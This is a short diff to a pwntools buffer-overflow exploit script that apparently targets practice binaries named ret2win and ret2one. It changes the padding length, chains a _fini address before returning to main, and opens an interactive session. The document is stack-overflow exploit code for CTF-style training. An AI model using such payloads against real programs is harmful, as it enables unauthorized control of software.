@@ -8,7 +8,8 @@ context.update(
         endian="little",
         log_level="debug",
         os="linux",
-        terminal=["tmux", "split-window", "-h", "-p 65"]
+        #terminal=["tmux", "split-window", "-h", "-p 65"]
+        terminal=["st"]
 )
 
 def start(binary):
@@ -24,16 +25,17 @@ def start(binary):
         return process(binary)
 
 def exploit(p,e,r):
-    pad = b'A' * 184
+    #pad = b'A' * 184
+    pad = b'A' * 136
     dum = p64(e.sym['_fini'])
-    win = p64(e.sym['win'])
+    win = p64(e.sym['main'])
 
-    p.sendline(pad + win)
+    p.sendline(pad + dum + win)
     p.interactive()
 
 
 if __name__=="__main__":
-    file = './bins/bin-ret2win-0'
+    file = './bins/bin-ret2one-4'
 
     p = start(file)
     e = context.binary = ELF(file)
